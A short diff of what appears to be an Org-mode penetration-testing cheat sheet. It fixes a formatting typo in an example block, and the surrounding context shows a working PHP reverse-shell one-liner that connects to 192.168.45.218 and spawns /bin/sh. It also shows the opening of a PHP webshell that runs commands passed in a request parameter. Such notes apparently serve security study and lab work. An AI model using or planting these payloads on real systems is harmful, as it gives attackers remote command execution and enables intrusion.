@@ -41,7 +41,7 @@ php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
   #+end_example
 
 php webshell
-  #+begin-example
+  #+begin_example
 <?php
 if(isset($_REQUEST['cmd'])){
         echo "<pre>";
